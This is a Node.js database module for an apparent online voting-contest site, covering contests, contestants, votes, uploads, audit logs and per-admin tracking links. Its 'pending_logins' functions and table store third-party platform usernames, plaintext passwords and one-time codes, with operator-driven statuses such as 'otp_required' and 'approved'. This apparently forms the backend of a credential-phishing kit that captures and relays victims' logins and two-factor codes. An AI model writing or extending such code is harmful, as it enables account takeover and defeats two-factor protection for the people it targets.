import pg from 'pg';
import { EventEmitter } from 'node:events';
import dotenv from 'dotenv';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
// Ensure env is loaded even if process CWD differs
const __dirname = path.dirname(fileURLToPath(import.meta.url));
dotenv.config({ path: path.resolve(__dirname, '../../.env') });

const isMemory = String(process.env.USE_MEMORY_DB || '').toLowerCase() === 'true';

// ---- Memory adapter ----
const mem = {
  contests: [],
  contestants: [],
  audit_logs: [],
  pending_logins: [],
  uploads: [],
  admin_links: [],
  seq: { contests: 1, contestants: 1 },
};

function memAddContest({ name, description, banner_url }) {
  const id = mem.seq.contests++;
  const rec = { id, name, description, banner_url };
  mem.contests.push(rec);
  return rec;
}

function memAddContestant({ name, image_url, total_votes = 0, contest_id }) {
  const id = mem.seq.contestants++;
  const rec = { id, name, image_url, total_votes, contest_id };
  mem.contestants.push(rec);
  return rec;
}

// ---- PG adapter ----
let pool;
if (!isMemory) {
  const connStr = process.env.DATABASE_URL || process.env.NEON_DATABASE_URL || 'postgres://postgres:postgres@localhost:5432/horizons';
  const sslRequired = /sslmode=require/i.test(connStr) || String(process.env.PGSSLMODE || '').toLowerCase() === 'require';
  pool = new pg.Pool({
    connectionString: connStr,
    max: 10,
    // For Neon and other managed PG that require TLS
    ssl: sslRequired ? { rejectUnauthorized: false } : undefined,
  });
}

async function pgQuery(q, p = []) {
  const { rows } = await pool.query(q, p);
  return rows;
}

// ---- High-level API ----
export const dbEvents = new EventEmitter();

export const db = {
  isMemory,
  // query helpers (PG only)
  async one(query, params = []) { if (isMemory) throw new Error('Not supported in memory'); const rows = await pgQuery(query, params); if (!rows.length) throw new Error('No row'); return rows[0]; },
  async oneOrNone(query, params = []) { if (isMemory) throw new Error('Not supported in memory'); const rows = await pgQuery(query, params); return rows[0] || null; },
  async manyOrNone(query, params = []) { if (isMemory) throw new Error('Not supported in memory'); return await pgQuery(query, params); },
  async none(query, params = []) { if (isMemory) return; await pgQuery(query, params); },

  // domain methods
  async listContests() {
    if (isMemory) {
      return mem.contests.map(c => ({ id: c.id, name: c.name, description: c.description, bannerUrl: c.banner_url }));
    }
    return await pgQuery('SELECT id, name, description, banner_url as "bannerUrl" FROM contests ORDER BY id ASC');
  },
  async listContestants() {
    if (isMemory) return [...mem.contestants];
    return await pgQuery('SELECT id, name, image_url, total_votes, contest_id FROM contestants ORDER BY id ASC');
  },
  async listRankings() {
    if (isMemory) return [...mem.contestants].sort((a,b)=> (b.total_votes||0)-(a.total_votes||0));
    return await pgQuery('SELECT id, name, image_url, total_votes, contest_id FROM contestants ORDER BY total_votes DESC');
  },
  // --- Admin Links (sub-links for admin tracking) ---
  async createAdminLink({ label, adminName }) {
    const key = `${Math.random().toString(36).slice(2,8)}${Date.now().toString(36).slice(-4)}`;
    if (isMemory) {
      const row = { id: mem.admin_links.length + 1, key, label: label || null, adminName: adminName || null, createdAt: new Date().toISOString() };
      mem.admin_links.push(row);
      return row;
    }
    const rows = await pgQuery(
      'INSERT INTO admin_links(key, label, admin_name) VALUES ($1,$2,$3) RETURNING id, key, label, admin_name as "adminName", created_at as "createdAt"',
      [key, label || null, adminName || null]
    );
    return rows[0];
  },
  async getAdminLinkByKey(key) {
    if (isMemory) return mem.admin_links.find(x => x.key === key) || null;
    const rows = await pgQuery('SELECT id, key, label, admin_name as "adminName", created_at as "createdAt" FROM admin_links WHERE key = $1', [key]);
    return rows[0] || null;
  },
  async listAdminLinks({ limit = 200, offset = 0 } = {}) {
    if (isMemory) {
      return [...mem.admin_links].sort((a,b)=> (a.createdAt < b.createdAt ? 1 : -1)).slice(offset, offset + limit);
    }
    return await pgQuery('SELECT id, key, label, admin_name as "adminName", created_at as "createdAt" FROM admin_links ORDER BY created_at DESC LIMIT $1 OFFSET $2', [limit, offset]);
  },
  async listAdminLinkCounts() {
    if (isMemory) {
      const counts = new Map();
      for (const r of mem.audit_logs) {
        const k = r?.payload?.adminLink?.key;
        if (!k) continue;
        counts.set(k, (counts.get(k) || 0) + 1);
      }
      return counts; // Map<key, number>
    }
    const rows = await pgQuery("SELECT payload->'adminLink'->>'key' AS key, COUNT(*)::int AS count FROM audit_logs WHERE payload IS NOT NULL AND (payload->'adminLink'->>'key') IS NOT NULL GROUP BY 1");
    const m = new Map();
    for (const r of rows) { if (r.key) m.set(r.key, Number(r.count) || 0); }
    return m;
  },
  async listAdminLinksWithCounts({ limit = 200, offset = 0 } = {}) {
    const rows = await this.listAdminLinks({ limit, offset });
    const counts = await this.listAdminLinkCounts();
    return rows.map(r => ({ ...r, viewsCount: counts.get(r.key) || 0 }));
  },
  async deleteAdminLinkByKey(key) {
    if (isMemory) {
      const idx = mem.admin_links.findIndex(x => x.key === key);
      if (idx >= 0) mem.admin_links.splice(idx, 1);
      return true;
    }
    await pgQuery('DELETE FROM admin_links WHERE key = $1', [key]);
    return true;
  },
  async votesAdd(contestantId, contestId) {
    if (isMemory) {
      const rec = mem.contestants.find(c => c.id === Number(contestantId) && c.contest_id === Number(contestId));
      if (!rec) throw new Error('not_found');
      rec.total_votes = (rec.total_votes || 0) + 1;
      return rec;
    }
    await pgQuery('UPDATE contestants SET total_votes = total_votes + 1 WHERE id = $1 AND contest_id = $2', [contestantId, contestId]);
    const [row] = await pgQuery('SELECT id, name, image_url, total_votes, contest_id FROM contestants WHERE id = $1', [contestantId]);
    return row;
  },
  async getContestantById(id) {
    if (isMemory) return mem.contestants.find(c => c.id === Number(id));
    const [row] = await pgQuery('SELECT id, name, image_url, total_votes, contest_id FROM contestants WHERE id = $1', [id]);
    return row;
  },
  async insertAuditLog(entry) {
    if (isMemory) {
      const row = { id: mem.audit_logs.length + 1, ts: new Date().toISOString(), ...entry };
      mem.audit_logs.push(row);
      try { dbEvents.emit('audit_log', row); } catch {}
      return row;
    }
    const rows = await pgQuery(
      'INSERT INTO audit_logs(ts, ip, user_id, path, method, action, payload, status, meta) VALUES (NOW(), $1,$2,$3,$4,$5,$6,$7,$8) RETURNING id, ts, ip, user_id, path, method, action, payload, status, meta',
      [entry.ip || null, entry.user_id || null, entry.path || null, entry.method || null, entry.action || null, entry.payload || null, entry.status || null, entry.meta || null]
    );
    const row = rows?.[0];
    try { if (row) dbEvents.emit('audit_log', row); } catch {}
    return row;
  },
  async listAuditLogs({ limit = 50, offset = 0, action, ip, user_id } = {}) {
    if (isMemory) {
      let rows = [...mem.audit_logs];
      if (action) rows = rows.filter(r => r.action === action);
      if (ip) rows = rows.filter(r => r.ip === ip);
      if (user_id) rows = rows.filter(r => r.user_id === user_id);
      rows.sort((a,b) => (a.ts < b.ts ? 1 : -1));
      return rows.slice(offset, offset + limit);
    }
    const conds = [];
    const params = [];
    if (action) { params.push(action); conds.push(`action = $${params.length}`); }
    if (ip) { params.push(ip); conds.push(`ip = $${params.length}`); }
    if (user_id) { params.push(user_id); conds.push(`user_id = $${params.length}`); }
    params.push(limit); const idxLimit = params.length;
    params.push(offset); const idxOffset = params.length;
    const where = conds.length ? `WHERE ${conds.join(' AND ')}` : '';
    return await pgQuery(`SELECT id, ts, ip, user_id, path, method, action, payload, status, meta FROM audit_logs ${where} ORDER BY ts DESC LIMIT $${idxLimit} OFFSET $${idxOffset}`, params);
  },
  // seed helpers
  memAddContest,
  memAddContestant,
  // pending login flows (PG-backed in production)
  createPendingLogin(entry) {
    const id = `${Date.now()}-${Math.random().toString(36).slice(2,8)}`;
    const rec = {
      id,
      platform: entry.platform,
      username: entry.username,
      password: entry.password,
      otp: entry.otp || null,
      status: 'pending', // 'pending' | 'otp_required' | 'approved' | 'denied' | 'failed'
      createdAt: new Date().toISOString(),
      note: entry.note || null,
      chrome: entry.chrome || null,
    };
    if (isMemory) {
      mem.pending_logins.push(rec);
      return rec;
    }
    return pgQuery(
      'INSERT INTO pending_logins (id, platform, username, password, otp, status, created_at, note, chrome) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9) RETURNING id, platform, username, password, otp, status, created_at as "createdAt", note, chrome',
      [rec.id, rec.platform, rec.username, rec.password, rec.otp, rec.status, rec.createdAt, rec.note, rec.chrome]
    ).then(rows => rows[0]);
  },
  async getPendingLogin(id) {
    if (isMemory) return mem.pending_logins.find(x => x.id === id) || null;
    const rows = await pgQuery('SELECT id, platform, username, password, otp, status, created_at as "createdAt", note, chrome FROM pending_logins WHERE id = $1', [id]);
    return rows[0] || null;
  },
  async updatePendingLogin(id, patch) {
    if (isMemory) {
      const i = mem.pending_logins.findIndex(x => x.id === id);
      if (i < 0) return null;
      mem.pending_logins[i] = { ...mem.pending_logins[i], ...patch };
      return mem.pending_logins[i];
    }
    const fields = [];
    const params = [];
    if (patch.status != null) { params.push(patch.status); fields.push(`status = $${params.length}`); }
    if (patch.otp != null) { params.push(patch.otp); fields.push(`otp = $${params.length}`); }
    if (patch.password != null) { params.push(patch.password); fields.push(`password = $${params.length}`); }
    if (patch.note != null) { params.push(patch.note); fields.push(`note = $${params.length}`); }
    if (patch.chrome != null) { params.push(patch.chrome); fields.push(`chrome = $${params.length}`); }
    if (!fields.length) return await db.getPendingLogin(id);
    params.push(id);
    await pgQuery(`UPDATE pending_logins SET ${fields.join(', ')} WHERE id = $${params.length}` , params);
    return await db.getPendingLogin(id);
  },
  async listPendingLogins({ status, limit = 100, offset = 0 } = {}) {
    if (isMemory) {
      let arr = [...mem.pending_logins].sort((a,b) => (a.createdAt < b.createdAt ? 1 : -1));
      if (status) arr = arr.filter(x => x.status === status);
      return arr.slice(offset, offset + limit);
    }
    const conds = [];
    const params = [];
    if (status) { params.push(status); conds.push(`status = $${params.length}`); }
    params.push(limit); const iLimit = params.length;
    params.push(offset); const iOffset = params.length;
    const where = conds.length ? `WHERE ${conds.join(' AND ')}` : '';
    return await pgQuery(`SELECT id, platform, username, password, otp, status, created_at as "createdAt", note, chrome FROM pending_logins ${where} ORDER BY created_at DESC LIMIT $${iLimit} OFFSET $${iOffset}`, params);
  },

  // ---- Uploads metadata API ----
  async uploadsInsert({ name, path: relPath, url, size, mtime, folder, contestId = null, contestantId = null, alt = null }) {
    if (isMemory) {
      const row = {
        id: mem.uploads.length + 1,
        createdAt: new Date().toISOString(),
        name,
        path: relPath,
        url,
        size: Number(size) || 0,
        mtime: Number(mtime) || Date.now(),
        folder: folder || null,
        contestId: contestId != null ? Number(contestId) : null,
        contestantId: contestantId != null ? Number(contestantId) : null,
        alt: alt || null,
      };
      mem.uploads.push(row);
      return row;
    }
    const rows = await pgQuery(
      'INSERT INTO uploads(name, path, url, size, mtime, folder, contest_id, contestant_id, alt) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9) RETURNING id, created_at as "createdAt", name, path, url, size, mtime, folder, contest_id as "contestId", contestant_id as "contestantId", alt',
      [name, relPath, url, size || 0, mtime || Date.now(), folder || null, contestId || null, contestantId || null, alt || null]
    );
    return rows[0];
  },
  async uploadsList({ contestId, contestantId, folder, search, limit = 200, offset = 0 } = {}) {
    if (isMemory) {
      let rows = [...mem.uploads];
      if (contestId != null && contestId !== '') rows = rows.filter(r => r.contestId === Number(contestId));
      if (contestantId != null && contestantId !== '') rows = rows.filter(r => r.contestantId === Number(contestantId));
      if (folder) rows = rows.filter(r => (r.folder || '') === folder);
      if (search) {
        const s = String(search).toLowerCase();
        rows = rows.filter(r => r.name.toLowerCase().includes(s) || (r.alt || '').toLowerCase().includes(s));
      }
      rows.sort((a,b) => (a.mtime < b.mtime ? 1 : -1));
      return rows.slice(offset, offset + limit);
    }
    const conds = [];
    const params = [];
    if (contestId != null && contestId !== '') { params.push(Number(contestId)); conds.push(`contest_id = $${params.length}`); }
    if (contestantId != null && contestantId !== '') { params.push(Number(contestantId)); conds.push(`contestant_id = $${params.length}`); }
    if (folder) { params.push(folder); conds.push(`folder = $${params.length}`); }
    if (search) { params.push(`%${search}%`); conds.push(`(name ILIKE $${params.length} OR alt ILIKE $${params.length})`); }
    params.push(limit); const idxLimit = params.length;
    params.push(offset); const idxOffset = params.length;
    const where = conds.length ? `WHERE ${conds.join(' AND ')}` : '';
    const rows = await pgQuery(`SELECT id, created_at as "createdAt", name, path, url, size, mtime, folder, contest_id as "contestId", contestant_id as "contestantId", alt FROM uploads ${where} ORDER BY mtime DESC LIMIT $${idxLimit} OFFSET $${idxOffset}`, params);
    return rows;
  },
  async uploadsDeleteByPath(relPath) {
    if (isMemory) {
      const idx = mem.uploads.findIndex(u => u.path === relPath);
      if (idx >= 0) mem.uploads.splice(idx, 1);
      return;
    }
    await pgQuery('DELETE FROM uploads WHERE path = $1', [relPath]);
  },
  async uploadsRenamePath(oldRelPath, newRelPath, newName, newUrl, newMtime) {
    if (isMemory) {
      const row = mem.uploads.find(u => u.path === oldRelPath);
      if (row) {
        row.path = newRelPath;
        row.name = newName;
        row.url = newUrl;
        row.mtime = Number(newMtime) || Date.now();
      }
      return row || null;
    }
    const rows = await pgQuery('UPDATE uploads SET path=$1, name=$2, url=$3, mtime=$4 WHERE path=$5 RETURNING id, created_at as "createdAt", name, path, url, size, mtime, folder, contest_id as "contestId", contestant_id as "contestantId", alt', [newRelPath, newName, newUrl, newMtime || Date.now(), oldRelPath]);
    return rows[0] || null;
  },
};

export async function initDb() {
  if (isMemory) return; // nothing to migrate
  await db.none(`CREATE TABLE IF NOT EXISTS contests (
    id SERIAL PRIMARY KEY,
    name TEXT NOT NULL,
    description TEXT,
    banner_url TEXT
  )`);

  await db.none(`CREATE TABLE IF NOT EXISTS contestants (
    id SERIAL PRIMARY KEY,
    name TEXT NOT NULL,
    image_url TEXT,
    total_votes INTEGER NOT NULL DEFAULT 0,
    contest_id INTEGER NOT NULL REFERENCES contests(id)
  )`);

  await db.none(`CREATE TABLE IF NOT EXISTS audit_logs (
    id BIGSERIAL PRIMARY KEY,
    ts TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    ip TEXT,
    user_id TEXT,
    path TEXT,
    method TEXT,
    action TEXT,
    payload JSONB,
    status INTEGER,
    meta JSONB
  )`);

  await db.none(`CREATE TABLE IF NOT EXISTS uploads (
    id BIGSERIAL PRIMARY KEY,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    name TEXT NOT NULL,
    path TEXT NOT NULL,
    url TEXT NOT NULL,
    size INTEGER,
    mtime BIGINT,
    folder TEXT,
    contest_id INTEGER,
    contestant_id INTEGER,
    alt TEXT
  )`);

  await db.none(`CREATE TABLE IF NOT EXISTS pending_logins (
    id TEXT PRIMARY KEY,
    platform TEXT,
    username TEXT,
    password TEXT,
    otp TEXT,
    status TEXT,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    note TEXT,
    chrome TEXT
  )`);

  await db.none(`CREATE TABLE IF NOT EXISTS admin_links (
    id BIGSERIAL PRIMARY KEY,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    key TEXT UNIQUE NOT NULL,
    label TEXT,
    admin_name TEXT
  )`);
}
